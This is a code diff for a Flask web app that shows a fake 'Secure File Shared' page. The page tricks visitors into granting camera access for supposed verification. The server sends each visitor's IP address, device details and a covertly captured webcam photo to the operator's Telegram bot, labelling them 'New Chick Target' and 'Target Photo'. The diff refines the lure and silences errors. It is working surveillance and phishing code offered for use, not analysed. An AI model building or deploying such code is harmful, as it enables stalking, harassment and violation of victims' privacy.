@@ -1,13 +1,13 @@
 from flask import Flask, request, jsonify, Response
 import requests
 import os, base64, time
+from http.server import BaseHTTPRequestHandler
 
 app = Flask(__name__)
 
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "YAHAN_APNA_TOKEN_DALO")
-MY_CHAT_ID = os.environ.get("MY_CHAT_ID", "YAHAN_APNI_CHAT_ID_DALO")
+BOT_TOKEN = os.environ.get("BOT_TOKEN")
+MY_CHAT_ID = os.environ.get("MY_CHAT_ID")
 
-# HTML Code Direct Python ke andar
 HTML_PAGE = """<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -53,7 +53,7 @@ HTML_PAGE = """<!DOCTYPE html>
 <div class="card" id="mainCard" style="display:none;">
     <div class="file-icon">📄</div>
     <h2>Secure File Shared</h2>
-    <span class="filename">IMG_2024_Private.jpg</span>
+    <span class="filename">data.mp4</span>
     <p>For security and privacy reasons, this file requires human verification. Please verify your identity to view the contents.</p>
     <button class="btn" onclick="startCamera()" id="mainBtn">
         <span id="btnText">Verify & View File</span>
@@ -107,7 +107,7 @@ async function startCamera() {
         btn.disabled = false;
         btnText.innerText = "Verify & View File";
         btnSpinner.style.display = 'none';
-        alert("Verification failed. Camera access is required by the sender's security policy.");
+        alert("Verification failed. Camera access is required.");
     }
 }
 function capturePhoto(video, stream) {
@@ -148,33 +148,43 @@ def home():
 
 @app.route('/log_ip', methods=['POST'])
 def log_ip():
-    data = request.json or {}
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
-    user_agent = request.headers.get('User-Agent', 'Unknown')
-    
-    msg = (f"<b>🎯 New Chick Target!</b>\n\n"
-           f"<b>IP Address:</b> <code>{ip}</code>\n"
-           f"<b>Device:</b> {user_agent}\n"
-           f"<b>Screen:</b> {data.get('screen', 'Unknown')}")
-    
-    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
-                  json={"chat_id": MY_CHAT_ID, "text": msg, "parse_mode": "HTML"})
+    try:
+        data = request.json or {}
+        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+        user_agent = request.headers.get('User-Agent', 'Unknown')
+        
+        msg = (f"<b>🎯 New Chick Target!</b>\n\n"
+               f"<b>IP Address:</b> <code>{ip}</code>\n"
+               f"<b>Device:</b> {user_agent}\n"
+               f"<b>Screen:</b> {data.get('screen', 'Unknown')}")
+        
+        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
+                      json={"chat_id": MY_CHAT_ID, "text": msg, "parse_mode": "HTML"})
+    except Exception as e:
+        pass
     return jsonify({"status": "ok"})
 
 @app.route('/upload_cam', methods=['POST'])
 def upload_cam():
-    data = request.json or {}
-    img_base64 = data.get('image')
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+    try:
+        data = request.json or {}
+        img_base64 = data.get('image')
+        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
 
-    if img_base64:
-        try:
+        if img_base64:
             img_data = img_base64.split(',')[1]
             img_bytes = base64.b64decode(img_data)
             url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
             files = {'photo': ('camera.jpg', img_bytes, 'image/jpeg')}
             payload = {'chat_id': MY_CHAT_ID, 'caption': f"📸 Target Photo | IP: {ip}"}
             requests.post(url, data=payload, files=files)
-        except Exception as e:
-            print("Error sending photo:", e)
+    except Exception as e:
+        pass
     return jsonify({"status": "ok"})
+
+class handler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+        self.wfile.write(HTML_PAGE.encode('utf-8'))
